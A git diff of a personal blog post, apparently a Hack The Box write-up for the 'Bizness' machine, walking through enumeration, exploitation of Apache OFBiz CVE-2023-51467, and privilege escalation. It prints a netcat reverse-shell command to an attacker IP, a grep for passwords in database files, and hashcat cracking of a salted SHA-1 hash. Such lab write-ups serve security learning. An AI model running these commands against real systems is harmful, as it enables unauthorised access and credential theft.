@@ -2,9 +2,14 @@
 title: HTB Writeup - Bizness
 date: 2024-01-11 14:28:47 +07:00
 modified: 2024-01-11 14:28:47 +07:00
-tags: [blog, netlify, jekyll, github]
+tags: [hackthebox, linux, boot2root, rce]
 description: All the services are free, a source code this site placed on github repository and intergration with netlify service, another service that you can use is github page for hosting your own static site.
 ---
+
+<img src="/assets/blog-images/htb-bizness/image0.png" alt="bizness">
+
+Hello, this is my first post on this blog. On this first post I'm going to explain the walktrough of the hackthebox machine called Bizness.
+First, we do the nmap scanning, to see what are the things that we can look for the foothold.
 
 # Information Gathering
 ```bash
@@ -60,6 +65,8 @@ OS and Service detection performed. Please report any incorrect results at https
 ```
 
 # Directory Enumaration
+After looking at the ports, there's only one thing that we can check which is the web application. When I visit bizness.htb, it automatically direct to `https://bizness.htb/`. Without further do, I just do the fuzzing to see if there is a juicy information that we can use.
+
 ```bash
 dirsearch -u https://bizness.htb/
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -91,7 +98,7 @@ Target: https://bizness.htb/
 [15:43:28] 200 -   11KB - /control/login                                    
 [15:43:29] 404 -  763B  - /default.html   
 ```
-Using dirsearch i found a foothold in a form of login page in the directory */control/login* 
+Using dirsearch I found a foothold in a form of login page in the directory */control/login* 
 
 <img src="/assets/blog-images/htb-bizness/image1.png" alt="Login Page">
 
@@ -99,60 +106,84 @@ Using dirsearch i found a foothold in a form of login page in the directory */co
 Doing some research on google to get to know about the version whether it's outdated or not.
 <img src="/assets/blog-images/htb-bizness/image2.png" alt="sources">
 
-found many resources that talked about the critical cve let's check the first one.
+found many resources that talked about the critical cve let's check the first one by [cybersecuritydiver](https://www.cybersecuritydive.com/news/apache-ofbiz-cve-exploitation/703788/)
+
 <img src="/assets/blog-images/htb-bizness/image3.png" alt="cybersecuritydive.com">
 
 We can see that service has outdated version which have vulnerability CVE-2023-51467 that could allowing an attacker to execute arbitrary code without authentication.
 
 # Exploitation
-Found this amazing poc that can make us easier to exploit the service. Clone the repository, and run as suggested.
+Found this amazing poc that can make us easier to exploit the service. Clone the repository, and run as suggested. Here's the link for [Github](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)
+
 <img src="/assets/blog-images/htb-bizness/image4.png" alt="POC">
 
-The poc runs well, now we able to get the rce using this command:
+Now we able to get the reverse shell using this command:
+
 `python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.14.59 1337'`
+
 <img src="/assets/blog-images/htb-bizness/image5.png" alt="exploitation">
 
-We got the  user flag
+Good, we got the  user flag
+
 <img src="/assets/blog-images/htb-bizness/image6.png" alt="Use Flag">
 
 # Privilege Escalation
-found hash on */opt/ofbiz/runtime/data/derby/ofbiz/seg0*  `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
-by using this grep command `grep -arin -o -E (\w+\W+){0,5}password(\W+\w+){0,5}' .`
+At first I was so confused to find the root and stuck. So I visit HTB forum to get some nudge and insight. Sorry, I'm noob here *sad
+
+So, I able to get some information on this path `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` but when you get into that there's bunch of files, it will takes a long time if you check it one by one.
+
+Therefore, I try to get this information, by using this grep command.
+
+`grep -arin -o -E (\w+\W+){0,5}password(\W+\w+){0,5}' .`
 
 <img src="/assets/blog-images/htb-bizness/image7.png" alt="hash">
 
-a bit of explanation about the purpose of the command:
-1. **`grep`**: This command is used for searching text patterns in files.
-    
-2. **`-a`**: This option forces `grep` to treat binary files as text. It can be useful when searching through files that may contain binary data.
-    
-3. **`-r`**: This option makes `grep` search recursively through directories, including subdirectories.
-    
-4. **`-i`**: This option makes the search case-insensitive, meaning it will match "password," "Password," "PASSWORD," etc.
-    
-5. **`-n`**: This option displays the line numbers along with the lines that match the pattern.
-    
-6. **`-o`**: This option prints only the matched parts of a line, rather than the entire line.
-    
-7. **`-E`**: This option enables extended regular expressions, allowing the use of parentheses `{}` for specifying repetition.
-    
-8. **`'(\w+\W+){0,5}password(\W+\w+){0,5}'`**: This is the regular expression being searched for. Let's break it down:
-    
-    - **`(\w+\W+){0,5}`**: This part matches up to 5 occurrences of word characters (`\w`) followed by non-word characters (`\W`). This allows for any characters (including spaces, punctuation, etc.) between the beginning of the line and the word "password."
-    - **`password`**: This is the literal string "password" that the command is searching for.
-    - **`(\W+\w+){0,5}`**: This part matches up to 5 occurrences of non-word characters followed by word characters. This allows for any characters between the word "password" and the end of the line.
-9. **`.`**: This specifies the current directory as the location to search.
+This a bit of explanation about the purpose of the command:
 
-decode it using  [cyberchef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'_'%7D,'/',false,false,false,false)Find_/_Replace(%7B'option':'Regex','string':'-'%7D,'%2B',false,false,false,false)From_Base64('A-Za-z0-9%2B/%3D',false,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ)
+    1. `grep`: This command is used for searching text patterns in files.
+    
+    2. `-a`: This option forces `grep` to treat binary files as text. It can be useful when searching through files that may contain binary data.
+    
+    3. `-r`: This option makes `grep` search recursively through directories, including subdirectories.
+    
+    4. `-i`: This option makes the search case-insensitive, meaning it will match "password," "Password," "PASSWORD," etc.
+    
+    5. `-n`: This option displays the line numbers along with the lines that match the pattern.
+    
+    6. `-o`: This option prints only the matched parts of a line, rather than the entire line.
+    
+    7. `-E`: This option enables extended regular expressions, allowing the use of parentheses `{}` for specifying repetition.
+    
+    8. `'(\w+\W+){0,5}password(\W+\w+){0,5}'`: This is the regular expression being searched for. Let's break it down:
+    
+        - `(\w+\W+){0,5}`: This part matches up to 5 occurrences of word characters (`\w`) followed by non-word characters (`\W`). This allows for any characters (including spaces, punctuation, etc.) between the beginning of the line and the word "password."
+        - `password`**: This is the literal string "password" that the command is searching for.
+        - `(\W+\w+){0,5}`: This part matches up to 5 occurrences of non-word characters followed by word characters. This allows for any characters between the word "password" and the end of the line.
+    9. `.`: This specifies the current directory as the location to search.
+
+    Big thanks to chatgpt for providing this brief explanation. lol
+
+After we found the hash, we cannot crack it immediately, we need to decode it first using [cyberchef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'_'%7D,'/',false,false,false,false)Find_/_Replace(%7B'option':'Regex','string':'-'%7D,'%2B',false,false,false,false)From_Base64('A-Za-z0-9%2B/%3D',false,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ)
 
 <img src="/assets/blog-images/htb-bizness/image8.png" alt="cyberchef">
-use 120 mode `sha1($salt.$pass)`
+
+Because the hash is in a form of SHA-1 and also it has salt we need to use 120 mode `sha1($salt.$pass)` on hashcat modules.
+
 <img src="/assets/blog-images/htb-bizness/image9.png" alt="Hashcat Module">
-Append the salt “:d” to crack it with hashcat
+
+This is important thing, append the salt “:d” to crack it with hashcat.
+
 <img src="/assets/blog-images/htb-bizness/image10.png" alt="hashcat">
-using this command `hashcat -a 0 -m 120 hash /home/corvuz/SecLists/Passwords/Leaked-Databases/rockyou.txt` we able to crack the hash.
+
+Using this command: 
+
+`hashcat -a 0 -m 120 hash /home/corvuz/SecLists/Passwords/Leaked-Databases/rockyou.txt` 
+
+Now we cracked the hash and found password.
 
 <img src="/assets/blog-images/htb-bizness/image11.png" alt="Login Page">
 
-now just su and use the password `monkeybizness`
+now just su and use the password `monkeybizness`, we are rooted.
+
+Thank you, for reading `:))`
  
